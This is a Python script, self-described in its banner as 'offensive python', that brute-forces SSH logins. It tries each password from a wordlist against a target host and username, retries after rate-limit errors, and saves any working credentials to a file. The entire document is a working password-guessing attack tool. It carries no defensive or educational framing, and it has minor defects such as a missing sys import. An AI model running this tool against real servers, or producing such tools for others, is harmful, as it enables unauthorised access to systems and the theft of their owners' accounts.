import fabric
import threading
import socket
import time
import paramiko
from colorama import init, Fore

init()

GREEN = Fore.GREEN
RED = Fore.RED
RESET = Fore.RESET
BLUE = Fore.BLUE
YELLOW = Fore.YELLOW

print(f"""{BLUE}



               +------------------------------------------------+
               |                  Coded by : L                  |
               |                                                |
               | https://github.com/shellbr3ak?tab=repositories |
               +------------------------------------------------+
                 ____  _          _ _ ____                 _    
                / ___|| |__   ___| | | __ ) _ __ ___  __ _| | __
                \___ \| '_ \ / _ \ | |  _ \| '__/ _ \/ _` | |/ /
                 ___) | | | |  __/ | | |_) | | |  __/ (_| |   < 
                |____/|_| |_|\___|_|_|____/|_|  \___|\__,_|_|\_|
                                               
                               offensive python
                               ----------------

{RESET}""")

def is_ssh_open(hostname, username, password):
    
    # initialize SSH client

    client = paramiko.SSHClient()

    # add to know hosts

    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        client.connect(hostname=hostname, username=username, password=password, timeout=3)
    except socket.timeout:

        # this is when host is unreachable
        print(f"{RED}[!] Host: {hostname} is unreachable, time out .{RESET}")
        return False

    except paramiko.AuthenticationException:
        print(f"[!] Invalid credentials for{YELLOW} {username}:{password}{RESET}")
        return False

    except paramiko.SSHException:
        
        print(f"\n\n{RED}[*] Quota exceeded, retrying with delay...{RESET}\n")
        # sleep for a minute to avoid SSH banner
        time.sleep(60)
        return is_ssh_open(hostname, username, password)
      
    except OSError:
        print(f"{RED} Make sure you have Internet Connection{RESET}")
        sys.exit(1)
    else:
      
        # connection was established successfully
        print(f"{GREEN}[+] Found combo:\n\tHOSTNAME: {hostname}\n\tUSERNAME: {username}\n\tPASSWORD: {password}{RESET}")
        return True

if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description="SSH Bruteforce Python script")
    parser.add_argument("host", help="Hostname or IP Address of SSH Server to bruteforce")
    parser.add_argument("-P", "--passlist", help="File that contains password list in each line")
    parser.add_argument("-u", "--user", help="Host username")

    # parse passed arguments
    args = parser.parse_args()
    host = args.host
    passlist = args.passlist
    user = args.user

    # read the file
    passlist = open(passlist).read().splitlines()
    
    # brute force
    for password in passlist:
        if is_ssh_open(host, user, password):
            # if combo is valid, save it to a file

            open("credentials.txt","w").write(f"{user}@{host}:{password}")
            break
